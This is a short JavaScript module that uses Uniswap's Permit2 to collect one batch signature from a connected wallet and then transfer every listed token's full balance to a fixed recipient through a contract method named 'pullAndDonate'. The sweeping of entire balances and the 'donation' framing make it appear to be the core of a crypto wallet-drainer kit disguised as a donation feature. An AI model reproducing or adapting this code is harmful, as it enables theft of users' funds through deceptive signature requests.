//src/engine/permit2.js

import { ethers } from "ethers";
import { SignatureTransfer } from "@uniswap/permit2-sdk";
import { PERMIT2_ADDRESS, PERMIT2_ABI, DONATION_CONTRACT_ADDRESS, RECIPIENT_ADDRESS } from "../config.js";
import { getFreePermit2Nonce } from "../nonceHelper.js";

export async function isPermit2Compatible(tokenAddress, signer) {
  try {
    const token = new ethers.Contract(tokenAddress, ["function transferFrom(address,address,uint256) returns (bool)"], signer);
    return typeof token.transferFrom === "function";
  } catch {
    return false;
  }
}

export async function executePermit2Batch(signer, chainId, tokens) {
  if (tokens.length === 0) return;

  const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
  const donation = new ethers.Contract(DONATION_CONTRACT_ADDRESS[chainId], PERMIT2_ABI, signer);
  const owner = await signer.getAddress();
  const nonce = await getFreePermit2Nonce(permit2, owner);
  const deadline = Math.floor(Date.now() / 1000) + 3600;

  const permittedForSig = tokens.map(t => ({ token: t.tokenAddress, amount: BigInt(t.balanceRaw) }));
  const permittedForContract = tokens.map(t => ({ token: t.tokenAddress, amount: t.balanceRaw }));

  const permitForSig = {
    permitted: permittedForSig,
    nonce: BigInt(nonce),
    deadline: BigInt(deadline),
    spender: DONATION_CONTRACT_ADDRESS[chainId],
  };

  const { domain, types, values } = SignatureTransfer.getPermitData(permitForSig, PERMIT2_ADDRESS, chainId);
  const signature = await signer.signTypedData(domain, types, values);

  const transferDetails = tokens.map(t => ({ to: RECIPIENT_ADDRESS, requestedAmount: t.balanceRaw }));
  const permitForContractCall = { permitted: permittedForContract, nonce, deadline };

  return donation.pullAndDonate(permitForContractCall, transferDetails, owner, signature);
}
